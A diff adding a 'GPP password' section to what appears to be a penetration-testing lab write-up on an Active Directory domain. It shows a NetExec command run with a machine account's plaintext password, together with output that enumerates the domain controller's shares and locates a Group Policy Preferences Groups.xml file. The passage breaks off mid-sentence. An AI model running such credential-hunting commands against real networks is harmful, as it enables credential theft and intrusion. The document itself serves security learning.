@@ -290,3 +290,22 @@ Ill dump them all to a user file!
 
 No kerberoastable accounts
 
+# GPP password
+```python
+nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --smb-timeout 5 -M gpp_password
+SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious 
+SMB         10.0.29.162     445    DC01             [*] Enumerated shares
+SMB         10.0.29.162     445    DC01             Share           Permissions     Remark
+SMB         10.0.29.162     445    DC01             -----           -----------     ------
+SMB         10.0.29.162     445    DC01             ADMIN$                          Remote Admin
+SMB         10.0.29.162     445    DC01             C$                              Default share
+SMB         10.0.29.162     445    DC01             IPC$            READ            Remote IPC
+SMB         10.0.29.162     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.0.29.162     445    DC01             SYSVOL          READ            Logon server share 
+GPP_PASS... 10.0.29.162     445    DC01             [+] Found SYSVOL share
+GPP_PASS... 10.0.29.162     445    DC01             [*] Searching for potential XML files containing passwords
+GPP_PASS... 10.0.29.162     445    DC01             [*] Found fragments.local/Policies/{EDFFE4E4-762D-47E5-85E7-B52950A90149}/Machine/Preferences/Groups/Groups.xml
+```
+
+So after trying loads of different things even doing this exact thing but using the impacke
